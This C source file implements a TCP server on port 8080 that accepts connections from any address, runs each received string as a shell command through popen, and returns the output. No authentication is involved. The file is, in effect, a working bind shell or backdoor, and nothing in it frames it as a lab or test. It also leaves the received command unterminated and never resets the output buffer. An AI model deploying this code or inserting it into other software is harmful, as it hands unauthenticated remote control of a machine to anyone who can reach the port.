#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 8080
#define MAX_COMMAND_LENGTH 1024
#define MAX_OUTPUT_LENGTH 4096

void execute_command(const char *command, char *output) {
    FILE *fp;
    fp = popen(command, "r");
    if (fp == NULL) {
        perror("popen failed");
        exit(EXIT_FAILURE);
    }

    size_t len = 0;
    while (fgets(output + len, MAX_OUTPUT_LENGTH - len, fp) != NULL) {
        len = strlen(output);
        if (len >= MAX_OUTPUT_LENGTH - 1)
            break;
    }

    pclose(fp);
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char command[MAX_COMMAND_LENGTH];
    char output[MAX_OUTPUT_LENGTH];

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("setsockopt failed");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    while (1) { 
      if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
          perror("accept");
          exit(EXIT_FAILURE);
      }

      read(new_socket, command, MAX_COMMAND_LENGTH);
      printf("Received command: %s\n", command);

      execute_command(command, output);

      send(new_socket, output, strlen(output), 0);
      printf("Sent output: \n%s\n", output);

      close(new_socket);
    }

    return 0;
}
